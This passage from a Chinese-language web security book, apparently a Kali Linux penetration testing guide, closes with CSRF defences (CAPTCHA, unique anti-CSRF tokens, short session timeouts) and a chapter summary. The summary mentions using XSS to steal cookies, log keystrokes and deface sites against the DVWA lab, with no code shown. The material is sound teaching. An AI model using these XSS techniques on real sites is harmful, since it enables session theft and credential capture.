3.  在执行关键任务之前，请使用验证码，因为用户必须手动通过测试才能继续。
4.  为每个 HTML 表单实现唯一的反 CSRF 令牌，因为攻击者不知道令牌的唯一值。
5.  关键网站应使用短会话超时值进行保护。会话越短，攻击成功的机会就越小，因为受害者不会登录应用来执行攻击。

# 总结

在本章中，我们详细讨论了跨站点脚本缺陷。我们首先了解了漏洞的起源及其多年来的演变过程。然后，我们了解了 XSS 的不同形式及其攻击潜力。JavaScript 是 XSS 攻击成功的关键；我们用它来偷饼干，记录按键，破坏网站。Kali Linux 有几个工具来测试和利用 XSS 缺陷，我们使用这些工具测试了 DVWA 应用。然后，我们继续进行跨站点请求伪造，并了解执行攻击的不同依赖关系和攻击方法。

在下一章中，我们将讨论 web 应用中使用的加密以及攻击它们的不同方式。